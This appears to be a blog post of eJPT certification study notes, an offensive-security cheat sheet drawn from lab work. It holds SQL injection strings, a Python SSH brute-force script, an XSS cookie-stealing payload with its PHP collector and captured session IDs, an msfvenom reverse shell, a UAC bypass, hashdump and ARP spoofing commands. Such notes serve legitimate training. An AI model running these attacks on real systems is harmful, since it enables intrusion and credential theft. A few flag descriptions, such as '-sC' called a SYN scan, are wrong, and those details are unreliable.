---
title: eJPT Notes [Arijit Bhowmick][sys41x4]
author: Arijit Bhowmick [sys41x4]
date: 2021-10-01 18:32:00 -0500
categories: [Certifications, eLearnSecurity, eJPT]
tags: [Course, Certification, eJPT, Notes, sys41x4, INE, "INE Free Training", eLearnSecurity, python]
permalink: "/certification/eLearnSecurity/eJPT/eJPT-notes-sys41x4.html"
---

[![eJPT Notes](/assets/htb/htb-img/htb_logo.jpeg)](http://sys41x4.github.io/certification/eLearnSecurity/eJPT/eJPT-notes-sys41x4.html)

# <b><u>Enumeration</u></b>

## <u>IP check</u>

### Check your connected interfaces and IPs

Use `ip addr` to get the list of interfaces and their ips

## <u>Route</u>

### <b>Get Network/s of IP-Address to test</b>

View the network to test using `route`

<u>Only display the required Network to test</u>

`route | grep tap0 | cut -d " " -f 1`

<u>Add a network to routing table</u>

`sudo ip route add 192.168.222.0/24 via 10.175.34.1`

<u>grep Command</u>

`grep` command is used to filter output text

<u>Notations</u>

```
-v ==> Used to print any other string which is/are not specified as string in the command
-r ==> recursive files and folders
```

<u>`cut` Command</u>

`cut` command is used to seperate words from an output text

<u>Notations</u>

```
-d ==> delimeter [used to specify string which are replaced and words are seperated as list]
-f ==> string positions to filter and print as output
```

<u>`wc` Command</u>

`wc` is used to count the characters, words, lines etc of a file

<b>Basic Command</b>

`wc -m payload.php`

<u>Notations</u>

```
-m ==> Counts bites length
-l ==> Counts number of lines
```

## <u>fping Scan</u>

### <b>fping Host Discovery Scan</b>

`fping -a -g <network> 2>/dev/null`

<u>Notations</u>

```
network ==> Network for Host Discovery
			Eg : 192.168.99.0/24
			     192.168.99.0-24
```

## <u>Nmap Scanning</u>
![Nmap Scan Image]()

### <b>Basic Nmap Syntax</b>

`nmap <ip-address>`

<u>Notations</u>

```
-sV ==> Service detection Scan
-sC ==> SYN Scan
-O ==> OS Fingerprinting
-oN <File-Name> ==> Save the scan output to a file
-sn ==> ping Scan for host Discovery
-Pn ==> Skip ping scan for host discovery
-v ==> Verbosity Level 1
-vv ==> Verbosity Level 2
-p ==> Port Scan
-p 80 ==> Scan port 80 of the provided IP-Address
-p1-100 ==> Portscan from 1 to 100
-p- ==> Scan every port
-iL <IP-List-File>==> Get IP from defined file name
```

### <b>Basic Nmap Commands used during INE Labs</b>

<u>Host Discovery Scan</u>

`sudo nmap -sn 10.100.13.0/24 -v -oN ./nmap/host_discovery.txt`

`sudo nmap -sn -iL network_list.txt -v -oN ./nmap/host_discovery.txt`

<u>Live Hosts Detailed Scan</u>

`sudo nmap -sC -sV -Pn -v -iL active_hosts.txt -oN ./nmap/live_hosts_detail_scan-nmap.txt`

<u>All Port Scan</u>

`sudo nmap -sC -sV -Pn -p- -v -iL active_hosts.txt -oN ./nmap/live_hosts_detail_scan-nmap.txt`

<u>Dump Active Hosts from Nmap Host Discovery Output File</u>

`cat ./nmap/host_discovery.txt | grep "Nmap scan report for" | grep -v "host down" | cut -d " " -f 5 > active_hosts.txt`

Here, `active_hosts.txt` contains the `IP-Addresses` of the provided machines to test.

<u>Sample Table of Nmap data</u>

```
╔══════════╦══════════════╦════════════════════════════════════════════════════════════╗
║ Protocol ║ Port Numbers ║                          Service                           ║
╠══════════╬══════════════╬════════════════════════════════════════════════════════════╣
║ TCP      ║ 22           ║ SSH                                                        ║
║ TCP      ║ 80, 443      ║ HTTP/HTTPS web server                                      ║
║ TCP      ║ 445          ║ Windows shares (SMB), also Linux equivalent -Samba service ║
║ TCP      ║ 25           ║ SMTP (Simple Mail Transfer Protocol)                       ║
║ TCP      ║ 21           ║ FTP (File Transfer Protocol)                               ║
║ TCP      ║ 137-139      ║ Windows NetBIOS services                                   ║
║ TCP      ║ 1433-1434    ║ 1433-1434 MSSQL Database                                   ║
║ TCP      ║ 3306         ║ MySQL Database                                             ║
║ TCP      ║ 8080, 843    ║ HTTP(s) web server, HTTP Proxy                             ║
║ UDP      ║ 53           ║ DNS                                                        ║
╚══════════╩══════════════╩════════════════════════════════════════════════════════════╝
```

# <b><u>SQL Injections</u></b>

## <u>Basic SQL Injection Strings</u>

<b>Boolean Attacks</b>

`' OR 1=1; -- -`


## <u>sqlmap</u>

### <b>Basic sqlmap command</b>

<u>Scanning URL [GET Parameter]</u>

`sqlmap -u <url-to-check>`

<u>Notations</u>

```
-u ==> specify url to check
-p ==> parameter to specify [eg, id]
--technique=U ==> Use Union Attacks
--technique=B ==> Use Boolean Attacks
--tables ==> Dump tables
-D ==> Specify Name of the Database
-T ==> Table Name to dump
--dump ==> Dump the content from the Database
```

## <u>JSQL Injection [GUI Software]</u>

`JSQL GUI` is a GUI application that can fetch database from sql injection, From `GET` request [the parameter being in the URL as `injection.php?id=123`]


# <b><u>Bruteforce Attacks</u></b>

## <u>Bruteforce Wordlists Suggested in INE LABS</u>

<b>USERNAME LIST 1:</b> `/usr/share/ncrack/minimal.usr`<br>
<b>PASSWORD LIST 1:</b> `/usr/share/seclists/Passwords/rockyou-10.txt`<br>
<b>PASSWORD LIST 2:</b> `/usr/share/seclists/Passwords/rockyou-15.txt`

## <u>Hydra</u>

<i>Attacking `telnet service`</i>

`hydra -L user_list.txt -P password_list.txt telnet://target.server`

<i>Attacking `http-get service`</i>

`hydra -L user_list.txt -P password_list.txt http-get://target.server`

<i>Attacking `ssh service`</i>

`hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt ssh://192.168.99.22:22`

<u>Notations</u>

```
-l ==> Password string to use
-L ==> Define List of usernames stored in a File

-p ==> Password string to use
-P ==> Define List of passwords stored in a File

telnet:// ==> used for telnet connection
http-get:// ==> used for http-get requests
```


## <u>Bruteforce Scripts</u>

```python

# Quick SSH password Checker

import socket
import ssh2

import paramiko
import socket
import time
from colorama import init, Fore


init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

# Username file
user_file = open("./SSH/recheck_userlist.txt", "r")
user_list = user_file.readlines()
user_file.close()

# Password file
pass_file = open("./SSH/recheck_passlist.txt", "r")
pass_list = pass_file.readlines()
pass_file.close()


# HOST
host = "192.168.99.22"


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo: HOSTNAME: {hostname} | USERNAME: {username} | PASSWORD: {password}{RESET}")
        return True

try:
        for user_id in range(len(user_list)):
                is_ssh_open(host, user_list[user_id].replace("\n",""), pass_list[user_id].replace("\n", ""))
except KeyboardInterrupt:
        exit()

```

### Basic Bruteforce Algorithm


```
# ALGORITHM [Bruteforce]

password_found = false
password_length = 1

while password_found == false
do 
	while can_create_password_of_length(password_length)
	do
		password = create_password_of_length(password_length)
		if (hash(password) match attacked_hash)
		then
			password_found = true
	done
	password_length = password_length +1
done

```


# <b><u>Password Cracking</u></b>

## <u>Hash Identification</u>

```
HashID
Name-That-Hash [https://github.com/HashPals/Name-That-Hash]
```

## <u>John The Ripper</u>

<b>Basic Command</b>

`john <hash-file>`

### <b>Commands Used in INE LABS</b>

`john  -incremental -users:<users list> <file to crack>`<br>
`john  -incremental -users:victim passwd_and_shadow_hashes.john`

<b>Show Already Cracked Passwords</b>

`john  --show passwd_and_shadow_hashes.john`

<b>Show Supported Formats in `john`</b>

`john --list=formats`

<b>Regular commands</b>

`john --wordlist=/usr/share/wordlists/rockyou.txt password_hashes.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt user_password_hashes.txt --format=NT`

<u>Notations</u>

```
-incremental ==> Use pure Bruteforce attack
                 [It require a lot of time to crack passwords]
--wordlist ==> Wordlist File to use [Dictionary Attacks]
--format ==> Type of hash to test for
             NT ==> For Windows hashdump
--list ==> list data according to need
-users:<username> ==> user of the password to crack
```

<b>Processing `/etc/shadow` and `/etc/passwd` file to john format</b>

`unshadow passwd shadow > passwd_and_shadow_hashes.john`

# <b><u>XSS Attacks [Cross-Site Scripting Attacks]</u></b>

<b>Only Works when website is not `HTTPOnly`</b>


## <u>XSS Scripts</u>

### <b>Basic XSS Payloads</b>

```
</b><img src=x onerror=alert(document.domain)></img><b>
</b><script>alert(document.domain)</script><b>
```

### <b>Open local File Server</b>

<b>Open local File server Using `PHP`</b>

`php -S 0.0.0.0:80`

<b>Open local File server Using `PHP`</b>

`python3 -m http.server 80`

### <b>Get Cookies As Request</b>

<b> Script Used in Attacker System for hosting

```php
/*
PAYLOAD to be used : 

<script> var i = new Image(); i.src="http://<url_where_this_script_is_placed>/get-data.php?cookie="+escape(document.cookie)</script>
*/

<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_Server['HTTP_USER_AGENT'];

$fp = fopen('gathered_info.txt', 'a');

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])." \n\n");
fclose($fp);
?>
```

<b>Strings(Cookie requests) Stored in `gathered_info.txt` File</b>

```
192.168.99.100  
cookie=PHPSESSID=3udrbq5j2km5spea10bu7lri07 

192.168.99.11  
cookie=PHPSESSID=il99fdtjli5mq8lvm7k6r07hd0 

192.168.99.100  
cookie=PHPSESSID=il99fdtjli5mq8lvm7k6r07hd0 

192.168.99.11  
cookie=PHPSESSID=dte29r9stjinkki7hlgt3iqe54 

192.168.99.11  
cookie=PHPSESSID=vkhfn0hno94cpg84m0elb7d1d2 
```

### <b>Other Resources</b>

```
Websites to practice XSS attacks:

[1] hack.me

Resources:

[1] The Web Application Hacker's Handbook
[2] OWASP - XSS
```

# <b><u>Null Session Attacks</b></u>

## <u>Null Session Attack Tools</u>

```
[1] enum4linux
[2] smbclient
[3] winfo
[4] enum
[5] NET USE
```

### <b>Enumeration and Exploitation Using `smbclient`</b>


Share Enumeration can be performed using tools provided by `Samba Suite`<br>
`smbclient` is an `FTP` like client to access `Windows shares`; this tool can, among other things, enumerate the shares provided by a host

<b>Command Example</b>

`smbclient -L //10.130.40.80 -N`

<b>Checking for Null Sessions with Linux<b>

We can also perform the very same checks by using `smbclient`:

`smbclient //10.130.40.80/IPC$ -N`

`smbclient //10.130.40.80/C$ -N`


### <b>Exploiting Null Sessions with `winfo`</b>

Winfo is another command line utility we can use to automate null session exploitation. To use it, you just need to specify the target IP address and use the -n command line switch to tell the tool to use null sessions.

`winfo` is available in `packetstorm` 

<b>Basic Command Syntax</b>

`winfo <ip-address> -n`

<u>Notation</u>
```
-n ==> Null Sessions
```

### <b>Exploiting Null Sessions with `enum`</b>

*** Please Note ***
It will note administrative shares too.<br>
`enum` is available in `packetstorm`

`enum -S <ip-address>`

`enum -U <ip-address>`

`enum -P <ip-address>`

<u>Notations</u>

```
-S ==> Enumerate the Shares of a Machine
-U ==> Enumerate the Users of a Machine
-P ==> Let us see the Password Policy if wwe want to mount the network
       [Authentication Attacks]
```

### <b>Enumerate Using `nmblookup`</b>

To perform the same operations of `nbstat`, we can use `nmblookup` with the same command line switch:

<b>Command Syntax</b>

`nmblookup -A <target-IP-Address>`


### <b>Enumerate using `NET VIEW`</b>

Once an attacker knows that a machine has File Server service running, they can enumerate the shares by using the `NET VIEW` command

<b>Command Syntax</b>

`NET VIEW <target-IP>`

### <b>Checking Null Sessions with Windows</u>

To connect, we have to type the following command in a Windows shell:

`NET USE \\<target-IP-address>\IPC$ '' /u:''`

This tells Windows to connect to the IPC$ share by using an empty password and an empty username!

# <b><u>Reverse Connection</b></u>


## <u>Netcat</u>

<b>Basic `Netcat` Command</b>

`nc -lnvp <port>` [In the Attacker Machine]

## <u>Metasploit</u>

<b>Generate PHP reverse shell [msfvenom]</b>

`msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.0.1 lport=4444 -o meterpreter.php`

```
$ msfconsole 
msf5> use exploit/multi/handler
msf5 exploit(handler)> set payload windows/meterpreter/reverse_tcp
msf5 exploit(handler)> set payload php/meterpreter_reverse_tcp
msf5 exploit(handler)> set lhost 192.168.0.1
msf5 exploit(handler)> set lport 4444
msf5 exploit(handler)> exploit
```

### <b>Add routing protocols in msfconsole</b>

`meterpreter> run autoroute -s 172.16.50.0/24`

### <b>Use SSH Bruteforce in msfconsole</b>

```
use auxiliary/scanner/ssh/ssh_login
show options
set rhosts 172.16.50.222
set user_file /usr/share/ncrack/minimal.usr
set pass_file /usr/share/ncrack/minimal.usr
set verbose true
run
```

<b>View Active sessions using `sessions` command</b><br>
<b>Interact with `sessions` using `sessions -i <number>`<b>
<b>Background a shell using <i>meterpreter> `background`</i> command</b>



Note that in modern Windows Operating systems, the User Account Control policy prevents privilege escalation.

```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect.
```
<b>Bypassing UAC</b>

You can bypass that restriction by using the bypassuac module.

```
meterpreter > background
[*] backgrounding session1 …

msf exploit(handler) > search bypassuac

msf  exploit(handler) > use exploit/windows/local/bypassuac

# Configuring the module

msf exploit(bypassuac) > show options
msf exploit(bypassuac) > set session 1
msf exploit(bypassuac) > exploit

# Bypassing UAC

The new session has the UAC policy disabled, so the getsystem command works !

meterpreter > getuid
Server username: els\els
meterpreter > getsystem
…got system (via technique 1)
```

<b>Dumping the Password Database</b>

For example, you can dump the passwords database and save it for an offline cracking session. The hashdump module dumps the password database of a Windows machine

`meterpreter > hashdump`

## <u>Collection of Reverse shell [Commands]</u>

`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md`

# <b><u>Interactive Shell</u></b>

## <u>python/python3 Interactive Shell</u>

Check if `python/python3` is available in system

`which python`
`which python3`

`python -c 'import pty;pty.spawn("/bin/bash")'`

## <u>Bash Interactive Shell</u>

`bash -i`

`SHELL=/bin/bash script -q /dev/null`


# <b><u>Find Commands</b></u>

## <u>Find files</u>

`find / -type f -name "*flag.txt" 2>/dev/null`

## <u>Find SUID Files</u>

`find / -user root -perm -4000 -print 2>/dev/null`

`sudo -l`

# <b><u>ARP Spoofing</b></u>

```
## Dsniff Arpspoof

Before running the tool, we have to enable the Linux Kernal IP Forwarding, a feature that transforms a Linux box into a router.

By enabling IP forwarding, you tell your machine to forward the packets you intercept to the real destination host.

# Command to enable the ip forward feature

echo 1 > /proc/sys/net/ipv4/ip_forward

We can then run arpspoof

# Command to use arpspoof

arpspoof -I <interface> -t <target> -r <host>

<interface> = tap0, eth0, etc
<target> = victim ip
<host> = host from where the packets are send

# To intercept traffic between 192.168.4.11 and 192.168.4.16 the command to be used is

echo 1 > /proc/sys/net/ipv4/ip_forward
Arpspoof -I tap0 -t 192.168.4.11 -r 192.168.4.16

We can then run Wireshark to intercept the traffic
```

# <b><u>Vulnerability Scanners</u></b>

```
[1] Nessus
[2] OpenVAS
[3] Nexpose
[4] GFI LAN Guard
```

# <b><u>Google Dorking</b></u>

## <u>Useful Commands and Meaning</u>

```
╔═══════════════╦═════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Command    ║                                                   Meaning                                                   ║
╠═══════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ site:         ║ You can use this command to include only results on a given hostname                                        ║
║ intitle:      ║ This command filters according to the title of a page                                                       ║
║ inurl:        ║ Similar to intitle but works on the URL of a resource.                                                      ║
║ filetype:     ║ This filters by using the file extension of a resource. For example .pdf or .xls.                           ║
║ AND, OR, &, | ║ You can use logical operators to combine your expressions. For example site:example.com OR site:another.com ║
║ -             ║ You can use this character to filter out a keyword or a command's result from the query                     ║
╚═══════════════╩═════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
```

## <u>Google Dorking Examples</u>

`-inurl :(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf`

<b>Google Dorking Database</b>

`https://www.exploit-db.com/google-hacking-database`

Thankyou, for reading my writeup :)<br>
Hope, I would see you in my next writeup.

<a href="/support/sys41x4">Support Me</a> if you want to.